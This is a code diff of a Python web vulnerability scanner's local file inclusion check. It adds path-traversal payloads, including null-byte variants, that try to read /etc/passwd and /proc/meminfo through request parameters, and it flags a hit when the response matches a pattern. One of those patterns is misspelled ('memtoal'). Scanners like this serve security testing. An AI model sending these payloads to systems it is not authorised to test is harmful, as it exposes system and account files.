@@ -3,6 +3,7 @@
 import logging
 import random
 import copy
+import re
 
 from simhash import Simhash
 
@@ -16,7 +17,7 @@ from .serverity import Serverity
 
 logger = logging.getLogger(__name__)
 
-
+@register('lfi')
 class LFI(CommonVulnerability):
 
     NAME = '本地文件包含'
@@ -46,10 +47,13 @@ class LFI(CommonVulnerability):
 
         playloads = self.__get_playloads(params)
         rt_list = []
-        for name, poc in playloads:
+        for name, poc, pattern in playloads:
             if name in white_params:
                 continue
-            response = callback(request.url, **{key : params})
+
+            response = callback(request.url, **{key : poc})
+            logger.debug('check result: %s, %s, %s, %s',
+                            request.url, key, poc, response)
 
             if not response.body or re.search(pattern, response.body, re.I) is None:
                 continue
@@ -63,10 +67,43 @@ class LFI(CommonVulnerability):
 
     def __get_playloads(self, params):
         playloads = []
+
+        lfis = self.__get_lfis()
         for name, value in params.items():
-            poc = copy.deepcopy(params)
             value = "".join(value) if isinstance(value, (list, )) else value
-            tpl = "{0}-->''''''\"\"\"\"\"\">>>>>>;;;;;;</ScRiPt>{1}//"
-            poc[name] = tpl.format(value, xss_key)
-            playloads.append((name, poc))
+
+            for lfi in lfis:
+                lfi_type = lfi['type']
+                pattern = lfi['pattern']
+                pls = lfi['playloads']
+                for pl in pls:
+                    poc = copy.deepcopy(params)
+                    poc[name] = pl
+                    playloads.append((name, poc, pattern))
+
         return playloads
+
+    def __get_lfis(self):
+        lfis = []
+        lfis.append({
+            'type' : 'meminfo',
+            'pattern' : r'memtoal:\s*\d+\s*\w{2}',
+            'playloads' : [
+                '/proc/meminfo',
+                '../../../../../../../../../../proc/meminfo',
+                '../../../../../../../../../../proc/meminfo\x00',
+                '../../../../../../../../../../proc/meminfo\x00.html',
+            ]
+        })
+
+        lfis.append({
+            'type' : 'passwd',
+            'pattern' : r'root:x:0:0:',
+            'playloads' : [
+                '/etc/passwd',
+                '../../../../../../../../../../etc/passwd',
+                '../../../../../../../../../../etc/passwd\x00',
+                '../../../../../../../../../../etc/passwd\x00.html',
+            ]
+        })
+        return lfis
